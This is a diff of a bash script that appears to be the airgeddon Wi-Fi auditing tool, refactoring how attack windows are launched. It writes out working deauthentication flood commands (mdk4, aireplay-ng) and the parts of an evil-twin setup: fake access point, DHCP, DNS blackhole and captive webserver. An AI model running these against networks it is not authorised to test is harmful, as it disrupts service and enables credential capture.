@@ -3400,20 +3400,23 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=1
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
-			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "mdk4 ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" > /dev/null 2>&1 &
+			manage_output "+j -bg black -fg red -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "mdk4 ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" "Deauth (DoS Pursuit mode)"
+			#xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "mdk4 ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" > /dev/null 2>&1 &
 		;;
 		"Aireplay")
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
 			iwconfig "${interface_pursuit_mode_deauth}" channel "${channel}" > /dev/null 2>&1
 			dos_delay=3
-			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" > /dev/null 2>&1 &
+			manage_output "+j -bg black -fg red -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "Deauth (DoS Pursuit mode)"
+			#xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" > /dev/null 2>&1 &
 		;;
 		"Wds Confusion")
 			dos_delay=10
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
-			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "mdk4 ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" > /dev/null 2>&1 &
+			manage_output "+j -bg black -fg red -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "mdk4 ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" "Deauth (DoS Pursuit mode)"
+			#xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "mdk4 ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" > /dev/null 2>&1 &
 		;;
 	esac
 
@@ -7688,7 +7691,8 @@ function launch_fake_ap() {
 			;;
 		esac
 	fi
-	xterm -hold -bg black -fg green -geometry "${hostapd_scr_window_position}" -T "AP" -e "${command}${log_command}" > /dev/null 2>&1 &
+	manage_output "-hold -bg black -fg green -geometry ${hostapd_scr_window_position} -T \"AP\"" "${command}${log_command}" "AP"
+	#xterm -hold -bg black -fg green -geometry "${hostapd_scr_window_position}" -T "AP" -e "${command}${log_command}" > /dev/null 2>&1 &
 	et_processes+=($!)
 	sleep 3
 }
@@ -7919,7 +7923,8 @@ function launch_dhcp_server() {
 			dchcpd_scr_window_position=${g4_middleleft_window}
 		;;
 	esac
-	xterm -hold -bg black -fg pink -geometry "${dchcpd_scr_window_position}" -T "DHCP" -e "dhcpd -d -cf \"${dhcp_path}\" ${interface} 2>&1 | tee -a ${tmpdir}/clts.txt" > /dev/null 2>&1 &
+	manage_output "-hold -bg black -fg pink -geometry ${dchcpd_scr_window_position} -T \"DHCP\"" "dhcpd -d -cf \"${dhcp_path}\" ${interface} 2>&1 | tee -a ${tmpdir}clts.txt 2>&1" "DHCP"
+	#xterm -hold -bg black -fg pink -geometry "${dchcpd_scr_window_position}" -T "DHCP" -e "dhcpd -d -cf \"${dhcp_path}\" ${interface} 2>&1 | tee -a ${tmpdir}/clts.txt" > /dev/null 2>&1 &
 	et_processes+=($!)
 	sleep 2
 }
@@ -7970,7 +7975,8 @@ function exec_et_deauth() {
 		launch_dos_pursuit_mode_attack "${et_dos_attack}" "first_time"
 		pid_control_pursuit_mode "${et_dos_attack}" "evil_twin" &
 	else
-		xterm -hold -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth" -e "${deauth_et_cmd}" > /dev/null 2>&1 &
+		manage_output "-hold -bg black -fg red -geometry ${deauth_scr_window_position} -T \"Deauth\"" "${deauth_et_cmd}" "Deauth"
+		#xterm -hold -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth" -e "${deauth_et_cmd}" > /dev/null 2>&1 &
 		et_processes+=($!)
 		sleep 1
 	fi
@@ -8867,7 +8873,8 @@ function launch_dns_blackhole() {
 	debug_print
 
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg blue -geometry "${g4_middleright_window}" -T "DNS" -e "${optional_tools_names[12]} -i ${interface}" > /dev/null 2>&1 &
+	manage_output "-hold -bg black -fg blue -geometry ${g4_middleright_window} -T \"DNS\"" "${optional_tools_names[12]} -i ${interface}" "DNS"
+	#xterm -hold -bg black -fg blue -geometry "${g4_middleright_window}" -T "DNS" -e "${optional_tools_names[12]} -i ${interface}" > /dev/null 2>&1 &
 	et_processes+=($!)
 }
 
@@ -8908,7 +8915,8 @@ function launch_et_control_window() {
 			control_scr_window_position=${g4_topright_window}
 		;;
 	esac
-	xterm -hold -bg black -fg white -geometry "${control_scr_window_position}" -T "Control" -e "bash \"${tmpdir}${control_et_file}\"" > /dev/null 2>&1 &
+	manage_output "-hold -bg black -fg white -geometry ${control_scr_window_position} -T \"Control\"" "bash \"${tmpdir}${control_et_file}\"" "Control"
+	#xterm -hold -bg black -fg white -geometry "${control_scr_window_position}" -T "Control" -e "bash \"${tmpdir}${control_et_file}\"" > /dev/null 2>&1 &
 	et_process_control_window=$!
 }
 
@@ -9155,7 +9163,8 @@ function launch_webserver() {
 	else
 		lighttpd_window_position=${g4_bottomright_window}
 	fi
-	xterm -hold -bg black -fg yellow -geometry "${lighttpd_window_position}" -T "Webserver" -e "lighttpd -D -f \"${tmpdir}${webserver_file}\"" > /dev/null 2>&1 &
+	manage_output "-hold -bg black -fg yellow -geometry ${lighttpd_window_position} -T \"Webserver\"" "lighttpd -D -f \"${tmpdir}${webserver_file}\"" "Webserver"
+	#xterm -hold -bg black -fg yellow -geometry "${lighttpd_window_position}" -T "Webserver" -e "lighttpd -D -f \"${tmpdir}${webserver_file}\"" > /dev/null 2>&1 &
 	et_processes+=($!)
 }
 
